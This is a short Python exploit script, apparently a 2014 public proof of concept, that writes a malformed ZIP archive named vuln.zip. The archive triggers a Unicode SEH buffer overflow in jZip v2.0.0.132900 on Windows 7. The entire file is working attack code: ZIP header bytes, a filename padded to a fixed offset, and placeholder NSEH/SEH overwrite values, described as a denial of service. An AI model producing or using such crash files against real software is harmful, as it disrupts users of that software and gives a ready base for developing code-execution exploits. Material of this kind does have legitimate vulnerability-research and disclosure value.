#!/usr/bin/python
######################################################
# Exploit title: seh unicode buffer overflow (DOS)
# Date: 16/04/2014
# Exploit Author: motaz reda [motazkhodair[at]gmail.com]
# Software Link : http://www.jzip.com/
# Version: jZip v2.0.0.132900
# Tested On: Windows 7 ultimate
########################################################

import sys, os

filename = "vuln.zip"


buffer = "\x50\x4B\x03\x04\x14\x00\x00"
buffer += "\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
buffer += "\x00\x00\x00\x00\x00\x00\x00\x00"
buffer += "\xe4\x0f"
buffer += "\x00\x00\x00"

eo = "\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
eo += "\x12\x10\x00\x00"
eo += "\x02\x10\x00\x00"
eo += "\x00\x00"

cdf = "\x50\x4B\x01\x02\x14\x00\x14"
cdf += "\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
cdf += "\x00\x00\x00\x00\x00\x00\x00\x00\x00"
cdf += "\xe4\x0f"
cdf += "\x00\x00\x00\x00\x00\x00\x01\x00"
cdf += "\x24\x00\x00\x00\x00\x00\x00\x00"

payload = "A" * 862
payload += "\x42\x42" # NSEH
payload += "\x42\x42" # SEH
payload += "D" * 3198
payload += ".txt"


file  = open(filename, "w")

zipfile = buffer + payload + cdf + payload + eo

file.write(zipfile)
file.close()

